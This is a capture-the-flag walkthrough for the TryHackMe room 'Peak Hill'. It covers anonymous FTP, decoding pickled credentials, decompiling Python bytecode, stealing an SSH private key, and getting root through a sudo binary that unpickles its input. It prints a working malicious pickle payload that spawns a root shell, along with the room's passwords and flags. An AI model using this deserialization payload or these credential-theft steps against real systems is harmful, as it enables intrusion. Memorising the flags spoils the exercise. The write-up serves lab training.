# TryHackMe: Peak Hill - Complete Walkthrough
Target IP: ```10.49.136.147```
OS: Linux (Ubuntu 16.04 LTS)
Difficulty: Medium

Attack Vector: Anonymous FTP -> Python Unpickling -> Decompilation (```.pyc```) -> Sudo Privilege Escalation

### Phase 1: Reconnaissance & FTP File Extraction
1. Initial Access & Enumeration
Connecting to the target via FTP using ```anonymous``` credentials reveals a hidden file containing binary-encoded data alongside a standard test file:
```bash
ftp 10.49.136.147
# Username: anonymous | Password: <blank>
ftp> ls -la
ftp> get test.txt
ftp> get .creds
```
- ```test.txt```: Default vsftpd test file.
- ```.creds```: A 7,048-byte file composed entirely of ASCII binary bits (0s and 1s).

### Phase 2: Credential Reconstruction (Pickle Deserialization)
1. Decoding ```.creds```
The ```.creds``` file contains serialized Python data represented as raw bits. The following script parses the bitstream in 8-bit chunks, converts it to standard bytes, and unpickles the data structure:
```python
import pickle

# Read raw binary bitstream
with open(".creds", "r") as f:
    bits = f.read().strip()

# Convert 8-bit sequences into bytes
data = bytes(
    int(bits[i:i+8], 2)
    for i in range(0, len(bits), 8)
)

print(f"[+] Decoded {len(data)} bytes")

# Save binary dump
with open("decoded.bin", "wb") as f:
    f.write(data)

# Unpickle object structure
obj = pickle.loads(data)
print("[+] Extracted Data:")
print(obj)
```
2. Tuple Alignment
The unpickled output consists of key-value tuples representing SSH username and password fragments:
| Key        | Value    | Key          | Value   | Key,Value    |
|:--         |:--       |:--           |:--      |:--           |
| ssh_user0  | g        | ssh_user3    | r       | ssh_user6,n  |
| ssh_user1  | h        | ssh_user4    | k       |              |
| ssh_user2  | e        | ssh_user5    | i       |              |

- Reconstructed Username: ```gherkin```
- Reconstructed Password (```ssh_pass0–ssh_pass27```): ```p1ckl3s_@11_@r0und_th3_w0rld```

### Phase 3: Initial Access & Telnet Credential Extraction
1. Local Enumeration via SSH
Logging into the target host as ```gherkin```:
```bash
ssh gherkin@10.49.136.147
# Password: p1ckl3s_@11_@r0und_th3_w0rld
```
A compiled Python bytecode file ```cmd_service.pyc``` is present in the home directory. Download it locally using ```scp```:
```bash
scp gherkin@10.49.136.147:cmd_service.pyc pythonss.pyc
```
2. Bytecode Decompilation & Variable Analysis
Decompiling ```cmd_service.pyc``` using PyLingual reveals two integer variables processed via ```Crypto.Util.number.long_to_bytes```:
- ```username``` integer: ```1684630636```
- ```password``` integer: ```2457564920124666544827225107428488864802762356```
Convert these integers back to ASCII using standard Python:
```python
from Crypto.Util.number import long_to_bytes

print(long_to_bytes(1684630636)) 
# Output: b'dill'

print(long_to_bytes(2457564920124666544827225107428488864802762356)) 
# Output: b'n3v3r_a_d1ll_m0m3nt'
```
3. Lateral Movement to ```dill```
Connect to the internal command service running on port 7321 via Telnet:
```bash
telnet 10.49.136.147 7321
# Username: dill
# Password: n3v3r_a_d1ll_m0m3nt
```
Extract the OpenSSH private key for ```dill```:
```bash
Cmd: cat /home/dill/.ssh/id_rsa
```
Save the key locally, adjust permissions, and establish a full SSH session:
```bash
vim dill_id_rsa
chmod 600 dill_id_rsa
ssh -i dill_id_rsa dill@10.49.136.147
```
- User Flag (/home/dill/user.txt): ```f1e13335c47306e193212c98fc07b6a0```

### Phase 4: Privilege Escalation (root)
1. Sudo Rights Enumeration
Running ```sudo -l``` indicates that ```dill``` can execute a binary located at ```/opt/peak_hill_farm/peak_hill_farm``` with ```root``` privileges without password prompting:
```bash
User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```
2. Exploiting Pickle Deserialization
Executing ```/opt/peak_hill_farm/peak_hill_farm``` prompts for a string input (```to grow:```) and deserializes base64-encoded Python pickle structures.
Generate a malicious payload leveraging Python's ```__reduce__``` magic method to execute a root shell:
```python
import pickle
import base64

class execute(object):
    def __reduce__(self):
        import os
        return (os.system, ("/bin/sh",))

payload = pickle.dumps(execute())
encoded = base64.b64encode(payload).decode()
print(encoded)
```
Output Payload:

```gASVIgAAAAAAAACMBXBvc2l4lIwAc3lzdGVtlJOUjAvYmluL3NolIWUUpQu```

3. Executing Root Shell
Supply the payload directly to the binary prompt:
```bashsudo /opt/peak_hill_farm/peak_hill_farm
# Prompt: to grow: gASVIgAAAAAAAACMBXBvc2l4lIwAc3lzdGVtlJOUjAvYmluL3NolIWUUpQu

# id
uid=0(root) gid=0(root) groups=0(root)

# find . -type f -name "*root*" -exec cat {} \;
```
- Root Flag: ```e88f0a01135c05cf0912cf4bc335ee28```
